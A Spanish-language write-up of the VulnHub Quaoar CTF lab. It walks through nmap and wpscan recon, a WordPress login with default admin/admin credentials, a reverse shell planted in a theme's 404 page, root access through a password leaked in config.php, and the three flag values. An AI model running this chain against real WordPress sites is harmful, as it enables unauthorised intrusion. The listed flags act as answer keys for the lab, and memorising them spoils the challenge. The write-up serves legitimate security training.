Title: hackfest2016: Quaoar Writeup
Date: 17/03/2017
Category: CTF
Tags: CTF, Writeup
Author: Xose
Summary: Writeup del CTF hackfest2016: Quaoar Writeup, descargado de [vulnhub](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/)
# FLAG 1 - SHELL

Después de hacer un netdiscover para encontrar la IP de la máquina, encuentro la máquina virtual en la IP: 192.168.110.101

Procedo a hacer un nmap:

```bash
nmap -T4 -A -v -p- 192.168.110.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-17 15:48 CET
NSE: Loaded 140 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:48
Completed NSE at 15:48, 0.00s elapsed
Initiating NSE at 15:48
Completed NSE at 15:48, 0.00s elapsed
Initiating ARP Ping Scan at 15:48
Scanning 192.168.110.101 [1 port]
Completed ARP Ping Scan at 15:48, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:48
Completed Parallel DNS resolution of 1 host. at 15:48, 0.01s elapsed
Initiating SYN Stealth Scan at 15:48
Scanning 192.168.110.101 [65535 ports]
Discovered open port 993/tcp on 192.168.110.101
Discovered open port 110/tcp on 192.168.110.101
Discovered open port 80/tcp on 192.168.110.101
Discovered open port 445/tcp on 192.168.110.101
Discovered open port 139/tcp on 192.168.110.101
Discovered open port 53/tcp on 192.168.110.101
Discovered open port 143/tcp on 192.168.110.101
Discovered open port 22/tcp on 192.168.110.101
Discovered open port 995/tcp on 192.168.110.101
Completed SYN Stealth Scan at 15:48, 0.69s elapsed (65535 total ports)
Initiating Service scan at 15:48
Scanning 9 services on 192.168.110.101
Completed Service scan at 15:49, 11.01s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 192.168.110.101
NSE: Script scanning 192.168.110.101.
Initiating NSE at 15:49
Completed NSE at 15:49, 8.22s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.01s elapsed
Nmap scan report for 192.168.110.101
Host is up (0.00018s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP SASL PIPELINING RESP-CODES STLS UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048.0
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-03-17T15:48:48+00:00; +59m39s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS more Pre-login LOGINDISABLEDA0001 STARTTLS IMAP4rev1 ID post-login listed have SASL-IR OK LITERAL+ IDLE capabilities ENABLE
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048.0
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-03-17T15:48:48+00:00; +59m39s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS Pre-login more IMAP4rev1 post-login ID listed capabilities have SASL-IR OK LITERAL+ IDLE AUTH=PLAINA0001 ENABLE
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048.0
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-03-17T15:48:48+00:00; +59m39s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: TOP SASL(PLAIN) PIPELINING RESP-CODES USER UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048.0
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-03-17T15:48:48+00:00; +59m40s from scanner time.
MAC Address: 08:00:27:4F:0E:C2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 198.840 days (since Tue Aug 30 20:39:30 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m39s, deviation: 1s, median: 59m39s
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   QUAOAR<00>           Flags: <unique><active>
|   QUAOAR<03>           Flags: <unique><active>
|   QUAOAR<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2017-03-17T11:48:48-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.18 ms 192.168.110.101

NSE: Script Post-scanning.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|_  59m39s: Majority of systems scanned
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
```

Nos encontramos varios puertos para IMAP curiosos de ver en una máquina de CTF.  
Viendo que hay puerto 80, vamos a entrar en la página web a ver que nos encontramos:

![Web]({filename}/images/quaoar/quaoar1.png)

Nos encontramos esta imagen de fondo que es un enlace que nos lleva a otra imagen con el texto "hack the planet".  
Como siempre, tirando por lo básico voy a checkear robots.txt y nos encontramos con esto:
![Web]({filename}/images/quaoar/robots.png)

Pues nada, parece que tenemos un wordpress, vamos a verlo:
![Web]({filename}/images/quaoar/wordpress.png)

Como podéis ver, hay un post con un link de wikipedia, mientras me hago una wordlist del enlace de wikipedia con cewl, hago un wpscan con enumerate de usuarios para ver que podemos encontrar...


```bash
root@kali-xose:~/Descargas# wpscan --url http://192.168.110.101/wordpress/ --enumerate u

_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.110.101/wordpress/
[+] Started: Fri Mar 17 15:54:28 2017

[!] The WordPress 'http://192.168.110.101/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.110.101/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.110.101/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.110.101/wordpress/wp-includes/

[+] WordPress version 3.9.14 identified from advanced fingerprinting (Released on 2016-09-07)
[!] 8 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 3.9.15

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 3.9.15

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8730
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 3.9.16

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https://wpvulndb.com/vulnerabilities/8765
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http://seclists.org/oss-sec/2017/q1/563
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https://wpvulndb.com/vulnerabilities/8766
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 3.9.17

[+] WordPress theme in use: twentyfourteen - v1.1

[+] Name: twentyfourteen - v1.1
 |  Location: http://192.168.110.101/wordpress/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 1.9
 |  Style URL: http://192.168.110.101/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username 'admin' is still used

[+] Finished: Fri Mar 17 15:54:32 2017
[+] Requests Done: 55
[+] Memory used: 17.664 MB
[+] Elapsed time: 00:00:03
```
Hay varias possibles vulnerabilidades, pero es interesante ver que el usuario admin por defecto está habilitado, vamos a probar de acceder con una contraseña por defecto admin/admin:
![]({filename}/images/quaoar/wpadmin.png)

Bingo, estamos dentro! Como el primer reto es conseguir un webshell vamos a por ello, editamos un archivo del theme, en mi caso la página de 404 y ahí ponemos el código de un webshell, yo he usado [este](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
![]({filename}/images/quaoar/themeshell.png)

luego accedemos por el navegador a la ruta de esa página del tema:
![]({filename}/images/quaoar/webshell.png)

y escuchamos por nc el puerto que hemos puesto en el webshell... Ya tenemos nuestro shell!
![]({filename}/images/quaoar/webshell2.png)

De primeras hago un cat a /etc/passwd para ver los usuarios del sistema y veo un usuario llamado wpadmin, voy a su /home/ y ahí encuentro el primer flag.
![]({filename}/images/quaoar/flag1.png)

```bash
$ cat flag.txt
2bafe61f03117ac66a73c3c514de796e
```

# FLAG 2 - ROOT

Ya tenemos nuestro primer flag, pero no nos da ninguna pista de como avanzar para encontrar nuestro segundo flag y acceso a root. Me dispongo a mirar de primeras el contenido de la web desde el shell por si me he dejado algo y al entrar en la ruta de la web me encuentro una carpeta llamada uploads, accedo en ella y ahí me encuentro un archivo de configuración, (config.php) vamos a ver que hay dentro:
![]({filename}/images/quaoar/configphp.png)

Pues parece que tenemos unas credenciales root:rootpassword!  
Vamos a probar a ver si con suerte podemos acceder con esta contraseña al usuario root.  
Invocamos terminal por python que sino no podemos hacer su y probamos:  

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Quaoar:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Quaoar:/$ su
su
Password: rootpassword!
root@Quaoar:/#   
```

Pues sí que ha funcionado! ya somos root, vamos a buscar el segundo flag!

```bash
root@Quaoar:/# cd /root/
cd /root/
root@Quaoar:~# ls
ls
flag.txt  vmware-tools-distrib
root@Quaoar:~# cat flag.txt
cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
root@Quaoar:~# 
```
# FLAG 3 - POST EXPLOTATION
Aquí lo tenemos! Pues parece que ya tenemos el flag y root debería estar todo, pero en las instrucciones de la máquina se informa de que hay un flag más post-explotación, vamos a buscarlo.

Después de un buen rato buscando en servicios y archivos flag.txt en el equipo no encuentro nada. Me pongo a mirar sobre los servicios IMAP instalados que nos habían salido en el nmap y al hacer un cat al cron por si teníamos ahí algo sobre el IMAP encuentro el tercert flag!

```bash
root@Quaoar:/# cat /etc/cron.d/*
cat /etc/cron.d/*
# /etc/cron.d/php5: crontab fragment for php5
#  This purges session files older than X, where X is defined in seconds
#  as the largest value of session.gc_maxlifetime from all your php.ini
#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
```

Y ya podemos dar por completada esta máquina.

Flag 1 - 2bafe61f03117ac66a73c3c514de796e  
Flag 2 - 8e3f9ec016e3598c5eec11fd3d73f6fb  
Flag 3 - d46795f84148fd338603d0d6a9dbf8de
